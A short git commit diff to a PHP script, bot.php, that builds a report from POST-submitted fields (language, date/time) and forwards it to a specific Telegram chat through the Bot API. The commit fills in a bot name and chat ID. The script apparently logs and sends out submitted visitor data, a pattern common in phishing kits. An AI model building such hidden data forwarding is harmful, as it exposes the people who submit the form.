a0773dd80d7422369649ac4c794d9ba3b4ea1aea
gladiador7777 <serbastianas5@gmail.com>
2025-01-25 21:18:08 -0300

    Update bot.php

--- bot.php
+++ bot.php
@@ -54,8 +54,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $conteudo .= "👥 | LINGUAGEM: $linguao\n";
         $conteudo .= "📆 | DATA/HORA: $dataHora\n\n";        
 
-        $botToken = 'SEU_TOKEN_BOT_AQUI_AMIGO';
-        $chatId = 'SEU_ID_AQUI';
+        $botToken = '@Hadesdos777_bot';
+        $chatId = '7571599089';
 
         $mensagem = urlencode($conteudo);
         $url = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$mensagem}";
